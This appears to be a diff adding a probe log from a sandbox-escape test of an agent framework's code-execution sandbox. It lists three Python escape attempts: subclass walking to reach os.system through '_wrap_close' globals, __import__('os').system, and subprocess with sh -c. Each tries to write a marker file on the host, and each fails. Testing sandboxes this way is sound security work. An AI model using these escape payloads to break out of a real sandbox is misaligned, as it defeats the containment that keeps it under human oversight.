@@ -1,0 +1,25 @@
+--- P12a
+code:
+subs = ().__class__.__base__.__subclasses__()
+names = [c.__name__ for c in subs]
+print('wrap_close' if '_wrap_close' in names else 'no-wrap_close', 'Popen' if 'Popen' in names else 'no-Popen')
+w = [c for c in subs if c.__name__ == '_wrap_close'][0]
+w.__init__.__globals__['system']('echo PWNED-a; echo PWNED-a > ~/p/agentic-search-bench/research/probes/ms-agent-framework-hyperlight/out/P12-escape-marker.txt')
+{"ok": false, "result": null, "error": "Execution error | details=None", "ms": 331.4}
+stdout (20 chars): 'wrap_close no-Popen\n'
+host marker written: False
+--- P12b
+code:
+__import__("os").system("echo PWNED-b; echo PWNED-b >> ~/p/agentic-search-bench/research/probes/ms-agent-framework-hyperlight/out/P12-escape-marker.txt")
+{"ok": false, "result": null, "error": "Execution error | details=None", "ms": 269.1}
+stdout (0 chars): ''
+host marker written: False
+--- P12c
+code:
+import subprocess
+print(subprocess.run(["sh", "-c", "echo PWNED-c >> ~/p/agentic-search-bench/research/probes/ms-agent-framework-hyperlight/out/P12-escape-marker.txt"]).returncode)
+{"ok": false, "result": null, "error": "Execution error | details=None", "ms": 247.1}
+stdout (0 chars): ''
+host marker written: False
+
+marker file contents: (absent)
